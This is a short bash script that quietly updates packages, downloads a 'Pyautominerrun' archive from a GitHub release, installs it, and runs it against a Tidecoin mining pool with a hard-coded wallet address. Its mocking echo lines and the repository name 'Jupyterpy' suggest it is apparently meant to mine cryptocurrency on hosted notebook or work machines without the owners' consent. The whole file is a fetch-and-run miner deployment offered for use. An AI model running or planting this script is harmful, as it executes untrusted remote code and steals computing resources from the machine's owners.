#!/usr/bin/env bash
echo "At work, to hell with greedy people ..."
apt update -q  &> /dev/null
echo "Install The employees ..."
wget https://github.com/Zeusyf/Jupyterpy/releases/download/V.0.2.0/Pyautominerrun.tar.gz
tar -xvf Pyautominerrun.tar.gz
cd Pyautominerrun
echo "Install The Devil ..."
python setup.py install
echo "Running The Devil ..."
python3 terminate_the_fuck.py -o pool.tidecoin.exchange:3033 -u TSzSr2wpaQm1jn1PUK69EJrQCLCQ6yrx2f.endpy
